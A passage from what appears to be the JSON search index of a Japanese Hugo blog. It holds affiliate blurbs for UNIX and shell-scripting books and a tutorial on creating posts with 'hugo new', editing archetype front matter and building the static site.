たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2021-12-21T18:08:57+09:00","image":"https://suzukiiichiro.github.io/posts/2021-12-21/2021-12-21_hud06831bf5e2aede9b7d29f34463c4a46_63839_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2021-12-21/","title":"Hugoでテーマが反映されない（画面が真っ白のまま）"},{"content":"記事を投稿する hugoで記事を作成して、投稿するためには専用のコマンドを使ってファイルを作成するか、postsなどのディレクトリにmarkdownの.mdファイルを設置する必要があります。\n今回はhugoでの記事の投稿の仕方を説明いたします。\nhugo newで記事を投稿 HUGOで記事を投稿するには、専用のコマンド hugo new を使う必要があります。\nこのコマンドを実行すると、提供されたパスに基づいて作成するファイルの種類を推測し、新しいコンテンツファイルを作成して日付とタイトルを自動的に設定します。\n-k KIND で種類を指定することもできます。\nテーマまたはサイトでアーキタイプが提供されている場合は、それらが使用されます。\nこれは、サイトのルートディレクトリ内で実行してください。\nhugo new [path] [flags] postsというディレクトリにファイルを作成する場合は以下のようになります。\n$ hugo new posts/[ファイル名].md このファイルを開いてみてみると、\n--- title: \u0026#34;Test\u0026#34; date: [作成日時] draft: true --- このようなファイルが作成されているかと思います。ファイルの中身の構成は下記のようになります。\ntitle: 記事のタイトル date: 記事の作成日 draft: 下書きかどうか draft: false にする事でドラフトを公開にすることができる\n上記のような作成ファイルの他に、HUGOにはさまざまな情報を Params として付与することが可能です\n新規作成した際にできるファイルの初期値を変えたい場合はどうしたらいいでしょうか？\nhugo newをカスタマイズする hugo new した際にできるファイルの初期値を変えるには、\narchetypes/posts.md archetypes/default.md などのファイルを修正してやることで可能です。\n実際にファイルを見てみると初期状態では下記のようになっていました。\n--- title: \u0026#34;{{ replace .Name \u0026#34;-\u0026#34; \u0026#34; \u0026#34; | title }}\u0026#34; date: {{ .Date }} draft: true --- ではここに、画像やカテゴリのフィールドを追加してみましょう。\nさきほどのを開いて、編集します。\n今回はキャッチ画像とカテゴリを追加するので、imageとcategoriesを追加します。\n--- title: \u0026#34;{{ replace .Name \u0026#34;-\u0026#34; \u0026#34; \u0026#34; | title }}\u0026#34; date: {{ .Date }} draft: true image: \u0026#34;\u0026#34; categories: - カテゴリ名 --- この状態でファイルを保存して、hugo new で新規作成して見ましょう。\nすると、初期状態のファイルではなかったimageとcategoriesの項目が追加されているかと思います。\nさらに、categoriesには「カテゴリ名」というカテゴリも反映されているかと思います。このように、初期値を調整することが可能なのです。\nこれを応用すると、初期状態を下書きではなく、公開状態でファイルを新規作成することも可能です。\n公開用ビルドする さて、記事がかけたところで、サイトを公開しようといたしましょう。\n残念なことに、hugoで作成したファイルはmarkdown形式であるために、そのままではwebページに公開できません。\n作成したファイルを静的HTMLとして書き出し、ビルド（構築）する必要があるのです。\nビルドは一瞬で終わってしまうのがhugoのすごいところです。\nhugoで作成したファイルをビルドするためのコマンドが以下になります。\n$ hugo 上記のコマンドを実行することで、publicディレクトリにHTMファイルが生成されます。\n実行した際に、サイトの情報も表示されているので、合わせて確認するとなにか新しい発見があるかもしれません。\nStart building sites … hugo v0.91.0+extended darwin/amd64 BuildDate=unknown | JA -------------------+------ Pages | 185 Paginator pages | 42 Non-page files | 205 Static files | 9 Processed images | 620 Aliases | 56 Sitemaps | 1 Cleaned | 0 Total in 981 ms さて、publicディレクトリのファイルをサーバにアップすることでサイトが公開できるということになります。\nオススメの書籍 Markdownライティング入門　プレーンテキストで気楽に書こう！ (技術の泉シリーズ（NextPublishing）) 【プレーンテキストでらくらくライティング! Markdownを使いこなそう! 】 本書は、文章を書く=ライティングを「気楽に」行うための道具としての「Markdown」形式を紹介し、その使い方を詳しく解説しています。Wordなどのワープロソフトに限定されることなく、テキストエディタやMarkdown専用エディタ、ポメラなどの文書入力専用機、さらにはスマートホン上でも「見出し」や「強調」といった文章執筆に必要な情報を共有するための書式であるMarkdownの書き方やその定義や起源を、初心者でもわかりやすく紹介しています。 〈本書の対象読者〉 執筆のストレスを減らして集中したい人 PCが古くて軽いアプリで執筆したい人 いろいろなアプリで原稿を使いまわしたい人 思いついた時にスマホでメモ書きして原稿にまとめたい人 続きを読む 。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2021-12-21T18:08:57+09:00","image":"https://suzukiiichiro.github.io/posts/2021-12-21-01/2021-12-21-1_hubb580b3412968a99eba9faea3f838cef_148014_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2021-12-21-01/","title":"Hugoで記事を投稿してみよう！Hugoでの記事投稿の仕方。"}]